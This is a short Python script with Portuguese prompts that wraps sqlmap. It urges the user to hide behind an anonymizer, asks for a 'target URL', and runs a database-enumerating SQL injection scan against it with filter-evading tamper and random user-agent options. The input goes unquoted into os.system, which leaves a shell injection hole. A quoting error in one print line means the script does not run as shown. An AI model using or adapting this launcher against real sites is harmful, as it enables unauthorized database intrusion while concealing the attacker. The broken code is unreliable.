import os

print("SEMPRE USE UM ANONIMALIZADOR ! ! !")
print("RECOMENDAÇÃO: use o anonsurf | para isso tem o script de instalação e execução "BR_AutoAnonsurf")


url = input(str("Digite ou cole o URL alvo: "))
os.system(f"sqlmap {url} --dbs --batch --random-agent --level 4 --risk 2 --tamper=space2comment")
